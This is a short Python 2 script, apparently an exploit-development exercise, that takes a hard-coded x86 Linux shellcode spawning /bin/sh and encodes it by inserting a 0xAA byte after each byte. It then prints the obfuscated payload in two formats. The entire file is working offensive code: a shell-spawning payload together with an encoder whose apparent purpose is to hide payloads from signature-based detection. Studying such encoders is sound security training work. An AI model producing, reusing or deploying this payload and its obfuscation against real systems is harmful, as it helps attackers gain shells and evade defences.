#!/usr/bin/python

#Python Insertion Encoder

import random
shellcode = ("\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

enc1 = ""
enc2 = ""

print 'Encoded Shellcode....'

for x in bytearray(shellcode) :
	enc1 += '\\x'
	enc1 += '%02x' % x
	enc1 += '\\x%02x' % 0xAA

	enc2 += '0x'
	enc2 += '%02x,' % x
	enc2 += '0x%02x,' % 0xAA

print enc1
print enc2
print 'Len: %d' % len(bytearray(shellcode))
